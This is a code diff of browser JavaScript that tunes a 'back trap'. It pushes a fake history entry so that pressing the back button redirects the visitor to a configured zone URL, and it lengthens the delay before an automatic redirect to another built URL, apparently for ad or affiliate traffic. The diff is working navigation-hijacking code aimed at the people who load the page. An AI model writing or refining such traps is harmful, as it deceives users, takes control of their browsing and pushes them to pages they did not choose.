@@ -164,15 +164,10 @@
         if (!APP_CONFIG.useBack || !APP_CONFIG.back_zoneId) return;
 
         const backUrl = buildBackUrl();
-        const count = Number(APP_CONFIG.back_count || 1);
 
-        setTimeout(() => {
-          try {
-            for (let i = 0; i < count; i += 1) {
-              history.pushState({ trap: i + 1 }, "", location.href);
-            }
-          } catch (_) {}
-        }, 50);
+        try {
+          history.pushState({ trap: 1 }, "", location.href);
+        } catch (_) {}
 
         addEventListener("popstate", function () {
           location.replace(backUrl);
@@ -203,7 +198,7 @@
       initBackTrap();
 
       const finalUrl = await buildAfuUrl(currentZone);
-      const delay = APP_CONFIG.useBack ? 500 : 0;
+      const delay = APP_CONFIG.useBack ? 1500 : 0;
 
       setTimeout(() => {
         window.location.href = finalUrl;
